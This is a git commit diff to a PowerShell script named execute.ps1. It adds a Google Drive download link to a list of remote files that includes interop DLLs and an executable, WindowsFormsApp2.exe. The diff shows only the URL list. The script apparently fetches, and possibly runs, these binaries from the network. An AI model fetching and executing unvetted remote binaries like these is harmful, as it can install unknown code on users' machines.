614849d0761b0e753aa28460496294dd9c5a2923
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-09 12:01:27 +0300

    Update execute.ps1

--- files/execute.ps1
+++ files/execute.ps1
@@ -1,6 +1,7 @@
 $urls = @(
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
+    "https://drive.usercontent.google.com/download?id=1P1IQxa4Wu7oS4AyQ1EGM5sjlygk_GDCA&export=download&authuser=0&confirm=t&uuid=1a34b49c-95fd-4cf0-a211-7d752c30aa58&at=APZUnTXtv0b3jmq1lze6zoU0TbTr%3A1712653224494",
     "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
 )
 
